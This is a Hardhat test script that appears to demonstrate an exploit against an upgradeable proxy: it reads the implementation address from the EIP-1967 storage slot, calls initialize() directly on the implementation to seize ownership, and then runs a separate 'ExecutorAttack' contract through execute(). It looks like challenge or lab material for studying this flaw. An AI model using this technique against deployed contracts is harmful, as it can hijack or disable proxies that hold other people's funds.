const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { ethers, waffle } = require("hardhat");

describe('Executor', function() {
  it('Change owner', async function() {
    const provider = waffle.provider;
    const [owner, attacker] = await ethers.getSigners();

    
    const Executor = await ethers.getContractFactory("Executor");
    const executor = await Executor.deploy();
    await executor.deployed();

    const Proxy = await ethers.getContractFactory("Proxy");
    const proxy = await Proxy.deploy(executor.address);
    await proxy.deployed();

    const slot = ethers.BigNumber.from('0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc');
    const slotData = await provider.getStorageAt(proxy.address, slot);

    const executorAddress = ethers.utils.getAddress("0x" + slotData.substring(26))
    expect(executorAddress).to.eq(executor.address);
    
    const executor2 = Executor.attach(executorAddress);
    const tx = await executor2.initialize();
    await tx.wait();

    const executorOwner = await executor2.owner();
    expect(executorOwner).to.eq(owner.address);

    const ExecutorAttack = await ethers.getContractFactory("ExecutorAttack");
    const executorAttack = await ExecutorAttack.deploy();
    await executorAttack.deployed();

    const tx2 = await executor2.execute(executorAttack.address)
    await tx2.wait();

    // const tx = await executorAttack.initialize();
    // await tx.wait();
    // const ownerAddress = await executor.owner();
    // expect(ownerAddress).to.equals(owner.address);

    // const tx = await executor.execute(executorAttack.address)
    // await tx.wait();
    
    // const ownerAddressAfter = await executor.owner();
    // console.log(ownerAddressAfter);
  })
}) 